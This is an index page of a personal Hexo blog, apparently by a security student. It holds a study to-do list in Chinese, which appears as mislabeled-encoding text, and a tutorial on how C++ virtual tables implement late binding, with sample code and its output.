<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","width":500,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"ä¸‡ä¸€æ‰¾åˆ°äº†å‘¢","hits_empty":"ä½ è¯´çš„ ${query} æˆ‘æ€ä¹ˆæ‰¾ä¸ç€å‘¢ ","hits_stats":"æ‰¾åˆ°äº† ${hits} ä¸ªç»“æœï¼Œç”¨æ—¶ ${time} æ¯«ç§’"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/6/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/24/todolist/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/24/todolist/" class="post-title-link" itemprop="url">ToDoList</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-24 00:06:00 / Modified: 00:04:56" itemprop="dateCreated datePublished" datetime="2022-09-24T00:06:00+08:00">2022-09-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ToDoList"><a href="#ToDoList" class="headerlink" title="ToDoList"></a>ToDoList</h1><p><del>2022.9.9åˆ°è¾¾å‰çº¿çš„ç¬¬äºŒå¤©,manimå·²ç»çœ‹æ¶å¿ƒäº†,æ•´ç†ä¸€ä¸‹æ€è·¯</del></p>
<p>2022.9.23åˆ°è¾¾å‰çº¿åŠä¸ªæœˆ,manimåŸºæœ¬æ”¾å¼ƒ,æ°´å¤ªæ·±,æ•´ç†ä¸€ä¸‹æ€è·¯</p>
<h2 id="ToDoList-on-9-23"><a href="#ToDoList-on-9-23" class="headerlink" title="ToDoList on 9.23"></a>ToDoList on 9.23</h2><h3 id="windows-äºŒè¿›åˆ¶"><a href="#windows-äºŒè¿›åˆ¶" class="headerlink" title="windows äºŒè¿›åˆ¶"></a>windows äºŒè¿›åˆ¶</h3><p>è¿™ä¸¤ä¸ªæ˜ŸæœŸå†…çš„è¿›å±•ä¸»è¦åœ¨&lt;&lt;0Dayå®‰å…¨ è½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯&gt;&gt;</p>
<p>&lt;&lt;0Dayå®‰å…¨ è½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯&gt;&gt;åŸºæœ¬çœ‹å®Œå‰6ç« ,ç•™ä¸€ä¸ª6.1 windows SEHæœºåˆ¶æ²¡çœ‹æ˜ç™½,6.1,11,14ç« éƒ½æ˜¯SEHç›¸å…³å†…å®¹,çœ‹ä¸å¤§åŠ¨äº†.è½¬åˆ°&lt;&lt;æ ¸å¿ƒåŸç†&gt;&gt;ç¬¬48ç« SEH,åšå®éªŒçœ‹çœ‹.</p>
<p>å‰ä¸¤å¤©åšæ¢¦ç»™ç¨‹åºæ‰“äº†ä¸€é’ˆ(ç‰©ç†ä¸Šç”¨é’ˆç®¡å­æœå†…å­˜æ¡å­ä¸Šæ‰äº†ä¸€é’ˆ),ç„¶åç¨‹åºå°±æœ‰å³é”®èœå•äº†,ç»“æœè¿™ä¸ªçš„å®ç°å°±çœŸçš„åœ¨&lt;&lt;åŠ å¯†ä¸è§£å¯†&gt;&gt;ä¸­æ‰¾åˆ°äº†,å·²åŠ å…¥ç­‰å¾…é˜Ÿåˆ—</p>
<p>å…¥å£ç‚¹çš„é€†å‘åˆ†æå¥½æ—©ä¹‹å‰å°±åƒçœ‹äº†,åˆ°ç°åœ¨ä¸€ç›´æ²¡çœ‹,è¿˜æœ‰å°±æ˜¯C++å…¨å±€å¯¹è±¡æ˜¯æ€ä¹ˆåˆå§‹åŒ–çš„,ä¸»è¦ä¾æ®æ˜¯&lt;&lt;è‡ªæˆ‘ä¿®å…»&gt;&gt; ç¬¬11ç« </p>
<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>éœ€è¦å®Œå–„ä¸€ä¸‹idaçš„ç”¨æ³•,ç›®å‰å¯ä»¥æƒ³åˆ°çš„æ˜¯è¯†åˆ«å‡½æ•°,ç»“æ„ä½“.</p>
<p>ä¸»è¦ä¾æ®æ˜¯IDAæƒå¨æŒ‡å—,ä¹‹å‰åªçœ‹å®Œå‰10ç« ,ä»¥åéœ€è¦çœ‹çš„æ˜¯ç¬¬å…«ç« ç»“æ„ç±»å‹,ä»¥åŠç¬¬11ç« ä¹‹å</p>
<h3 id="è®¡ç½‘"><a href="#è®¡ç½‘" class="headerlink" title="è®¡ç½‘"></a>è®¡ç½‘</h3><p>ä»€ä¹ˆå·®é”™æ§åˆ¶éƒ½æ‘†çƒ‚æ²¡çœ‹,è¯¥å­¦é“¾è·¯å±‚äº†,å’Œä¹‹å‰çš„å·®é”™æ§åˆ¶å…³ç³»å¥½åƒä¸æ˜¯å¾ˆå¤§.</p>
<p>ä¸‹é¢è¦è®²çš„åè®®æŒºæœ‰æ„æ€,å¯ä»¥çœ‹çœ‹</p>
<h3 id="è®¡ç»„"><a href="#è®¡ç»„" class="headerlink" title="è®¡ç»„"></a>è®¡ç»„</h3><p>æµæ°´çº¿åŸºæœ¬æ²¡å¬è¯¾,å…‰çŸ¥é“ç®—é‚£å‡ ä¸ªBæ•°ä»€ä¹ˆååç‡å•¥çš„æœ‰ä¸ªğŸ”¨æ„æ€?</p>
<p>ä¸‹é¢IO,ç«¯å£,ä¸­æ–­,ä¸­æ–­å‘é‡,å¯ä»¥çœ‹çœ‹</p>
<h3 id="whatâ€™s-next"><a href="#whatâ€™s-next" class="headerlink" title="whatâ€™s next"></a>whatâ€™s next</h3><p>å®éªŒå®¤ç»ˆäºæœ‰åœºåœ°äº†,å¯ä»¥æ³¡å®éªŒå®¤äº†</p>
<p>ä¸‹é¢æƒ³çœ‹ä¸€ä¸‹&lt;&lt;æ ¸å¿ƒåŸç†&gt;&gt;45ç« ä»¥å,TLS,PEB,TEB</p>
<h2 id="ToDoList-on-9-9"><a href="#ToDoList-on-9-9" class="headerlink" title="ToDoList on 9.9"></a>ToDoList on 9.9</h2><h3 id="ä»¥å¾€çš„é”™è¯¯"><a href="#ä»¥å¾€çš„é”™è¯¯" class="headerlink" title="ä»¥å¾€çš„é”™è¯¯"></a>ä»¥å¾€çš„é”™è¯¯</h3><p>å¤ªéš¾çš„CTFç›´æ¥æ‘†çƒ‚</p>
<p>æ‰“å®ŒCTFæ‡’å¾—å¤ç›˜,å¾ˆå¤šé¢˜åšäº†ä¸€åŠå°±åºŸäº†</p>
<p>ä¸æ•¢çœ‹CVE,æ€»æ˜¯è§‰å¾—çœ‹ä¸æ˜ç™½,æ€»æ˜¯æƒ³çœ‹å®Œæ‰€æœ‰ä¹¦å†å¼€å§‹</p>
<p>åšçš„é¢˜å¤ªå°‘,linuxåŠ¨æ€é“¾æ¥å½“æ—¶ä¼šäº†,ç°åœ¨åˆæ¨¡ç³Šäº†,å†åšret2libcåˆæŠ“ç</p>
<h3 id="win32ç¨‹åºè®¾è®¡"><a href="#win32ç¨‹åºè®¾è®¡" class="headerlink" title="win32ç¨‹åºè®¾è®¡"></a>win32ç¨‹åºè®¾è®¡</h3><p>å†™å®Œè®°äº‹æœ¬,æ‰«é›·,ç„¶åé€†å‘è‡ªå·±å†™çš„è¿˜æœ‰winxpè‡ªå¸¦çš„</p>
<h3 id="x86æ±‡ç¼–è¯­è¨€ä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼"><a href="#x86æ±‡ç¼–è¯­è¨€ä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼" class="headerlink" title="x86æ±‡ç¼–è¯­è¨€ä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼"></a>x86æ±‡ç¼–è¯­è¨€ä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼</h3><p>å·²ç»çœ‹å®Œçš„æ˜¯3.4.5.6.10.11.13.14</p>
<p>ä½†æ˜¯ä»ç¬¬5ç« ä¹‹åæ„Ÿè§‰å¾ˆè™šå¾ˆè™š,åªæ˜¯åˆ†æäº†ä¸€ä¸‹æºç å†™äº†æ³¨é‡Š,å®éªŒå‡ ä¹éƒ½æ²¡åš,è¿™å¯¼è‡´åæ¥çœ‹13.14çš„è¯¾åå®éªŒæ—¶å•¥ä¹Ÿå†™ä¸å‡ºæ¥.éœ€è¦è¡¥ä¸Š.</p>
<h3 id="æ•°æ®åº“-è®¡ç½‘"><a href="#æ•°æ®åº“-è®¡ç½‘" class="headerlink" title="æ•°æ®åº“,è®¡ç½‘"></a>æ•°æ®åº“,è®¡ç½‘</h3><p>è®¡ç½‘å¸¦å®½,é€Ÿç‡é‚£ä¸€å¨å…¬å¼æ²¡å¤§å¬,å‚…é‡Œå¶å˜æ¢è¿˜æ²¡çœ‹æ‡‚</p>
<p>æ•°æ®åº“ä¸æƒ³å¬è¯¾,è¯¾æœ¬è½ä¸‹100é¡µæ²¡çœ‹äº†</p>
<h3 id="manim"><a href="#manim" class="headerlink" title="manim"></a>manim</h3><p>æ€ä¹ˆç”»æ¤­åœ†?</p>
<p>æ€ä¹ˆç”»åˆ‡çº¿?</p>
<p>éƒ½æœ‰å•¥å‡½æ•°å¯ä»¥ç”¨?</p>
<p>è¶Šæ¥è¶Šæ„Ÿè§‰è¿™é‡Œæ°´å¾ˆæ·±,è¦ç”¨é¡ºæºœå¿…é¡»å¾—çœ‹æºç </p>
<p>è¿™ç©æ„ä¹Ÿä¸ç”¨åšç¬”è®°,ä»£ç çœ‹æ‡‚äº†ç”¨ä¸€æ¬¡å°±è®°ä½äº†</p>
<p>geogebraé‡Œé¢çš„ä¸€äº›åŠŸèƒ½,å¯¹åº”åˆ°manimé‡Œé¢æ€ä¹ˆç”¨?</p>
<p>è¿™ä¸ªå¯ä»¥è®°ä¸€ä¸‹,åªè®°å‡½æ•°æ¥å£.å¯èƒ½çœ‹çœ‹APIå°±ä¼šäº†å§</p>
<p>å…ˆæ”¾æ”¾,å…ˆæ”¾æ”¾</p>
<h3 id="é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†"><a href="#é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†" class="headerlink" title="é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†"></a>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†</h3><p>æ¶ˆæ¯é’©å–åœ¨win11ä¸ŠæˆåŠŸäº†,ä½†æ˜¯DLLæ³¨å…¥ç™½æ­</p>
<p>æ¶ˆæ¯é’©å–åçš„è°ƒè¯•ä¹Ÿæ²¡ä¸Šæœºå®éªŒ</p>
<h3 id="ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»"><a href="#ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»" class="headerlink" title="ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»"></a>ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»</h3><p>éœ€è¦å¤ä¹ ä¸€ä¸‹ç¬¬8ç« linuxå…±äº«åº“,ç„¶åç¬¬11,12,13è¿˜æ²¡çœ‹</p>
<h3 id="CSAPP"><a href="#CSAPP" class="headerlink" title="CSAPP"></a>CSAPP</h3><p>å¯ä»¥çœ‹ç¬¬å››ç« äº†,æ­£å¥½è®¡ç»„å­¦åˆ°æµæ°´çº¿äº†</p>
<p>ç¬¬9ç« æœ‰ä¸ªmallocçš„å®ç°,ç­‰ç©å…·å†…æ ¸å†™åˆ°ä¸€å®šç¨‹åº¦äº†,éœ€è¦ç”¨ç®—æ³•ç®¡ç†å†…å­˜çš„æ—¶å€™å†è¯´å§</p>
<h3 id="è®¡ç½‘è‡ªé¡¶å‘ä¸‹"><a href="#è®¡ç½‘è‡ªé¡¶å‘ä¸‹" class="headerlink" title="è®¡ç½‘è‡ªé¡¶å‘ä¸‹"></a>è®¡ç½‘è‡ªé¡¶å‘ä¸‹</h3><p>ç¬¬å››ç« ç½‘ç»œå±‚æ”¾å‡å‰çœ‹å®Œäº†,ä½†æ˜¯å½“æ—¶æ²¡æœ‰åšç¬”è®°,æ˜¯é€¼ç€è‡ªå·±çœ‹å®Œçš„,å¾ˆè™š,éœ€è¦å†çœ‹ä¸€é</p>
<p>ç¬¬ä¸‰ç« ä¼ è¾“å±‚çš„TCPåè®®è¿˜æ²¡çœ‹</p>
<h3 id="Whatâ€™s-Next"><a href="#Whatâ€™s-Next" class="headerlink" title="Whatâ€™s Next?"></a>Whatâ€™s Next?</h3><p>æ¶æ¶å¿ƒå¿ƒçš„,å…ˆçœ‹CSAPP ç¬¬å››ç« å§,ç›¸å¯¹æ¥è¯´æ˜¯ä¸ªè½¯æŸ¿å­</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/23/C++%E6%99%9A%E8%81%94%E7%BC%96%E6%9C%BA%E5%88%B6%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/23/C++%E6%99%9A%E8%81%94%E7%BC%96%E6%9C%BA%E5%88%B6%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">C++æ™šè”ç¼–æœºåˆ¶å¦‚ä½•å®ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-23 22:00:00" itemprop="dateCreated datePublished" datetime="2022-09-23T22:00:00+08:00">2022-09-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-03-10 20:41:33" itemprop="dateModified" datetime="2025-03-10T20:41:33+08:00">2025-03-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="C-æ™šè”ç¼–å¦‚ä½•å®ç°"><a href="#C-æ™šè”ç¼–å¦‚ä½•å®ç°" class="headerlink" title="C++æ™šè”ç¼–å¦‚ä½•å®ç°"></a>C++æ™šè”ç¼–å¦‚ä½•å®ç°</h1><h2 id="è™šå‡½æ•°å¯¹-å¯¹è±¡çš„å†…å­˜ç»“æ„çš„å½±å“"><a href="#è™šå‡½æ•°å¯¹-å¯¹è±¡çš„å†…å­˜ç»“æ„çš„å½±å“" class="headerlink" title="è™šå‡½æ•°å¯¹ å¯¹è±¡çš„å†…å­˜ç»“æ„çš„å½±å“"></a>è™šå‡½æ•°å¯¹ å¯¹è±¡çš„å†…å­˜ç»“æ„çš„å½±å“</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1) <span class="comment">//å–æ¶ˆæ‰€æœ‰å¯¹é½è¦æ±‚</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    public:</span><br><span class="line">    <span class="type">char</span> only[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>&#123;</span></span><br><span class="line">    public:</span><br><span class="line">    <span class="type">char</span> only[<span class="number">1</span>];</span><br><span class="line">    virtual <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">A a;</span><br><span class="line">B b;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="keyword">sizeof</span>(A)&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;<span class="keyword">sizeof</span>(B)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;&amp;a&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;&amp;a.only&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;&amp;b&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;&amp;b.only&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\testC++\testCpp&gt; g++ main.cpp -O0 -o main -m32</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\testC++\testCpp&gt; ./main</span><br><span class="line"><span class="number">1</span>  <span class="number">5</span></span><br><span class="line"><span class="number">0x4da020</span>  <span class="number">0x4da020</span></span><br><span class="line"><span class="number">0x4da024</span>  <span class="number">0x4da028</span></span><br></pre></td></tr></table></figure>

<p>aå’Œbä¸¤ä¸ªå¯¹è±¡çš„å”¯ä¸€åŒºåˆ«å°±æ˜¯,bæœ‰ä¸€ä¸ªè™šå‡½æ•°,aæ²¡æœ‰</p>
<p>ä½†æ˜¯bå´åˆ5ä¸ªå­—èŠ‚å¤§å°,aåªæœ‰1ä¸ª,</p>
<p>açš„åŸºåœ°å€å°±æ˜¯açš„ç¬¬ä¸€ä¸ªæˆå‘˜onlyçš„åŸºåœ°å€</p>
<p>bçš„åŸºåœ°å€åŠ ä¸Š4åç§»æ‰åˆ°å…¶ç¬¬ä¸€ä¸ªæˆå‘˜onlyçš„åŸºåœ°å€</p>
<p>bæœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ç©¶ç«Ÿè—äº†ä»€ä¹ˆå‘¢?è™šè¡¨æŒ‡é’ˆ</p>
<h2 id="å¤šæ€ä¸æ™šè”ç¼–"><a href="#å¤šæ€ä¸æ™šè”ç¼–" class="headerlink" title="å¤šæ€ä¸æ™šè”ç¼–"></a>å¤šæ€ä¸æ™šè”ç¼–</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in father func1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	virtual <span class="type">int</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a + b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in father func3&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span>public A &#123;</span><br><span class="line">public:</span><br><span class="line">	<span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in son func1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in son func3&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	A* handle = new B;</span><br><span class="line">	handle-&gt;func1();<span class="comment">//åªæœ‰è¿™ç§æŒ‡é’ˆè°ƒç”¨æ–¹å¼æ‰å¯ä»¥å¤šæ€ï¼Œç”¨Â·å·æˆå‘˜ç¬¦å·æ— æ³•è°ƒç”¨</span></span><br><span class="line">	handle-&gt;func2(<span class="number">5</span>, <span class="number">6</span>);<span class="comment">//è™šå‡½æ•°,ä½†æ˜¯æ²¡æœ‰é‡è½½è°ƒç”¨å­ç±»è™šå‡½æ•°</span></span><br><span class="line">	handle-&gt;func3();<span class="comment">//æ™®é€šæˆå‘˜å‡½æ•°,ä½†æ˜¯handleæ˜¯Aç±»å‹æŒ‡é’ˆ,å› æ­¤ä¼šè°ƒç”¨Aç±»çš„func3å‡½æ•°</span></span><br><span class="line">	delete handle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="A-handle-new-B"><a href="#A-handle-new-B" class="headerlink" title="A* handle &#x3D; new B;"></a>A* handle &#x3D; new B;</h3><p>mainå‡½æ•°å¼€å§‹è¿™ä¹ˆä¸€å¨,å°±å¹²äº†<code>A* handle = new B;</code>è¿™ä¸€ä¸ªäº‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922184558826.png" alt="image-20220922184558826"></p>
